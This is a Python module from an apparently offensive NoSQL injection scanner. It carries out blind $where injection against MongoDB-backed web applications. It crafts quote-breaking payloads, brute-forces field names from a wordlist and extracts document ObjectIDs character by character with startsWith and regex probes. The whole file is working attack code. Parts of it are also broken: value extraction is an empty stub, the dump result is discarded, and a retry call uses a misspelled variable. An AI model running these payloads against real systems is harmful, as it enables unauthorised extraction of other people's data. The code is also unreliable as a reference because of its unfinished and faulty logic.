import copy;
import difflib;
from util.output import verbose;
from util.output import success;
from util.output import failure;
from util.output import question;
from util.output import info;
from util.output import bold;

import threading;
from itertools import combinations;

class WhereObjectIDEnumerationBlindInjection:
    def doc(self):
        bold("--Description--");
        print("This module is an abandoned technique that was made inferior due to JSONStringify.");
        print("It works by attempting to retrieve objectIDs via startsWith checks. It will then use these\
        IDs to try and gather ID-related data. This method was much slower due to how long it took to\
        gather object IDs");
        
    def getID(self):
        return -1;
        
    def getType(self):
        return "w";
    def __init__(self,url,param,scanner):
        self.url = url;
        self.param = param;
        self.scanner = scanner;
        self.options = {'q':"'","front":True,"back":True};
        #q, quote to use
        #front, if payload must start with quote
        #back, if payload must end with quote
        self.keyAttribute = "";
        self.toGrabInFuture = [];
        self.objectIDs = [];

    def vulnTest(self):
        failPayl = "\\";
        data = copy.deepcopy(self.scanner.data);
        data[self.param] = failPayl;
        self.scanner.textErrorBaseline = self.scanner.sendData(data).text;

        if self.scanner.textErrorBaseline != self.scanner.textBaseline:
            success("Basic check succeeded!");
        else:
            bold("Basic check failed. The rest of this module may not work.");
        
        for options in self.getAllOptions():
            verbose("Testing with: " + str(options));
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = self.buildPayload(options," || '' == '");
            req = self.scanner.sendData(data);
            if req.text != self.scanner.textErrorBaseline:
                self.options = options;
                verbose("Error-based content check worked!");
                return True;

        return False;

    def getAllOptions(self):
        allOptions = [{'q':"'","front":True,"back":True},\
         {'q':"'","front":False,"back":True},\
         {'q':"'","front":True,"back":False},\
         {'q':"'","front":False,"back":False},\
         {'q':"\"","front":True,"back":True},\
         {'q':"\"","front":False,"back":True},\
         {'q':"\"","front":True,"back":False},\
         {'q':"\"","front":False,"back":False},\
         ];
        return allOptions;

    def buildPayload(self,options,payload):
        q = options["q"];
        reverseQuotes = '"';
        if q == '"':
            reverseQuotes = "'";
        front = options["front"];
        back = options["back"];
        payload = payload.replace("'",q);
        payload = payload.replace("\\\"",reverseQuotes);
        if front:
            payload = q + payload;
        
        if back:
            payload += q;

        return payload;

    def grabData(self):
        if len(self.scanner.element_attributes) > 0:
            if question("There are already some found attributes. Do you want to find again with this module?"):
                self.grabElementAttributes();
        else:
            self.grabElementAttributes();
        
        if len(self.scanner.element_attributes) > 0:
            success("Some attributes are present. We can proceed to step 2.");
            bold("Attributes to be used:");
            for attribute in self.scanner.element_attributes:
                bold("- " + attribute);
        else:
            failure("No attributes could be found. We cannot dump anything.");
            return None;
            
        
        if len(self.scanner.objectIDs) > 0:
            if question("There are already some found IDs. Do you want to find again with this module?"):
                self.grabIDs();
        else:
            self.grabIDs();
        
        if len(self.scanner.objectIDs) == 0:
            failure("No IDs found. Database may be empty.");
            return None;
            
        if len(self.scanner.objectIDs) > 0:
            success("Some ObjectIDs are present. Proceeding with step 3.");
            
        grabbedData = {};
        for objectID in self.scanner.objectIDs:
            dump = self.grabDataFromID(objectID);
            grabbedData[objectID] = dump;
        
        output = [];
        for id in grabbedData:
            output.append(id);
            dump = grabbedData[id];
            for attrib in dump:
                value = dump[attrib]["value"];
                output.append("\t" + attrib + " : " + str(value));
            
        return ["Element Attributes:"] + self.scanner.element_attributes + ["","Object IDs:"] + self.objectIDs;
        
    def grabDataFromID(self,objectID):
        dump = {};
        for attribute in self.scanner.element_attributes:
            if attribute == "_id":
                continue;
            length = -1;
            value = None;
            try:
                testLength = 0;
                bold("Attempting to retrieve length of " + attribute + " for ID " + objectID);
                while length == -1:
                    testLength += 1;
                    if testLength == 70:
                        if question("The length seems unnaturally long. Skip this attribute?"):
                            break;
                    regex = "^"+"."*testLength+"$";
                    payload = self.buildPayload(self.options," || this." + attribute + ".toString().match(\\\"" + regex + "\\\") && this._id.str == '" + objectID);
                    data = copy.deepcopy(self.scanner.data);
                    data[self.param] = payload;
                    req = self.scanner.sendData(data);
                    check = self.scanner.check(req);
                    if check != "none":
                        length = testLength;
                        success("Retrieved length " + str(testLength) + " for " + attribute + " for ID " + objectID);

            except Exception as e:
                print(e);
                failure("Failed to retrieve exact length for " + attribute + " for ID " + objectID);
                
            try:
                if length == -1:
                    failure("Failed to retrieve " + attribute + " for ID " + objectID);
                    continue;
                
                bold("Attempting to retrieve value of " + attribute + " for ID " + objectID);
                
                
                
            except Exception as e:
                print(e);
                failure("Failed to retrieve value of " + attribute + " for ID " + objectID);
            
            dump[attribute] = {"length":length,"value":value};
        return dump;
                    
    
    def grabIDs(self):
        
        if "_id" not in self.scanner.element_attributes:
            #All elements MUST have _id. If this was not found, then this probably wasn't an element.
            failure("_id was not one of the found attributes. Cannot dump.");
        else:
            self.keyAttribute = "_id";
        bold("Using " + self.keyAttribute + " as a unique key.");
        
        self.toGrabInFuture = [];
        self.dumpIDValue();
        
        threads = [];
        while len(self.toGrabInFuture) > 0:
            var = self.toGrabInFuture.pop();
            self.dumpIDValue(var=var,retry=5);
            
        for id in self.objectIDs:
            if id not in self.scanner.objectIDs:
                success("New ObjectID: " + id);
                self.scanner.objectIDs.append(id);
            else:
                bold("Re-confirmed id: " + id);

        
    def dumpIDValue(self,var=[],retry=0):
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\\!#$%&._()*+,-/:;<=>?@{|}[]^`~"
        
        while len(var) < 24:
            prev = len(var);
            threads = []
            for c in charset:
                if len(threads) > self.scanner.maxthreads:
                    threads.pop().join();
                thread = threading.Thread(target = self.dumpIDChar, args = (var,c));
                threads.append(thread);
                thread.start();

            for thread in threads:
                thread.join();
            
            if prev == len(var):
                failure("Something went wrong.");
                if retry < 10:
                    self.dumpIDValue(var,retry+1);
        bold("Found an ObjectID: " + "".join(var));
        self.objectIDs.append("".join(var));

    def dumpIDChar(self,var,c):
        length = 24;
        try:
            speshul = self.options["q"]+"\\";
            oldVar = copy.deepcopy(var);
            oldVarLength = len(var);
            condition = "".join(var) + c;
            if c in speshul:
                condition = "".join(var) + "\\" + c;
            
            payload = self.buildPayload(self.options," || this._id.str.startsWith(\\\"" + condition + "\\\") && '' == '");
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = payload;
            req = self.scanner.sendData(data);
            check = self.scanner.check(req);
            oldVar.append(c);
            if check != "none":
                if len(var) == oldVarLength:
                    #failure("Added "+c);
                    var.append(c);
                    
                    verbose("".join(var) + "."*(length-len(var)));
                elif oldVar not in self.toGrabInFuture:
                    self.toGrabInFuture.append(oldVar);
                    verbose("Found alternative, will test later: "+"".join(oldVar));
                    #info(self.fromVarToString(oldVar) + "."*(length-len(oldVar)));
        except Exception as e:
            failure(str(e));
            self.dumpIDChar(var,c);
        
    def retrieveLengths(self,maxLength,attribute):
        lengths = [];
        for length in range(1,maxLength+1):
            try:
                regex = "^"+"."*length+"$";
                payload = self.buildPayload(self.options," || this." + attribute + ".toString().match(\\\"" + regex + "\\\") && '' == '");
                data = copy.deepcopy(self.scanner.data);
                data[self.param] = payload;
                req = self.scanner.sendData(data);
                check = self.scanner.check(req);
                if check != "none":
                    lengths.append(length);
                    success("Retrieved length " + str(length));
            except Exception as e:
                print(e);
                failure("Failed to retrieve exact length.");
                return lengths;
        return lengths;

    def retrieveMaxLength(self,attribute):
        try:
            length = 1;
            
            payload = self.buildPayload(self.options," || this." + attribute + ".toString().match(\\\".{" + str(length) + "}\\\") && '' == '");
            
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = payload;
            req = self.scanner.sendData(data);
            
            while self.scanner.check(req) != "none":
                if length == 70:
                    if question("Length abnormally long. Do you want to terminate the program?"):
                        return -1;
                length += 1;
                payload = self.buildPayload(self.options," || this." + attribute + ".toString().match(\".{" + str(length) + "}\") && '' == '");
                data = copy.deepcopy(self.scanner.data);
                data[self.param] = payload;
                req = self.scanner.sendData(data);

            success("Retrieved max length: " + str(length-1));
            return length-1;
        except Exception as e:
            print(e);
            failure("Failed to retrieve max length.");
            return -1;

    #Get a list of element attributes.
    def grabElementAttributes(self):
        if len(self.scanner.element_attributes) > 0:
            if not question("There were some element attributes previously found. Try finding attributes again?"):
                return;
        bold("A bruteforce method is being used to recover columns. This may take a while.");
        
        
        file = open("txt/common-columns.txt","r");
        common = file.read().strip().split("\n");
        file.close();

        threads = [];
        newAttributes = [];
        tried = 0;
        for attribute in common:
            tried += 1;
            if tried > self.scanner.maxbrute and self.scanner.maxbrute != 0:
                info("Tested for " + str(self.scanner.maxbrute) + " attributes out of " + str(len(common)) + ". Use the -maxbrute flag to increase the number of tests.");
                break;
            if len(threads) > self.scanner.maxthreads:
                threads.pop().join();
            verbose("Trying attribute " + attribute);
            thread = threading.Thread(target = self.tryElementAttribute, args= (attribute,newAttributes));
            threads.append(thread);
            thread.start();

        for thread in threads:
            thread.join();

        for attribute in newAttributes:
            self.scanner.element_attributes.append(attribute);

    #Try for a particular element attribute
    def tryElementAttribute(self,attribute,newAttributes,retry=0):
        if retry > 10:
            failure("Failed to connect to target 10 times! Consider killing the program.");
            return;
        try:

            payload = self.buildPayload(self.options," || this." + attribute + ".toString().match(/.*/) && '' == '");
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = payload;
            req = self.scanner.sendData(data);

            if req.text != self.scanner.textErrorBaseline:
                if attribute not in self.scanner.element_attributes:
                    newAttributes.append(attribute);
                    success("Found an element attribute: " + attribute);
                else:
                    info("Element attribute: " + attribute + " reconfirmed.");
        except:
            self.tryElementAttribute(atrribute,newAttributes,retry+1);
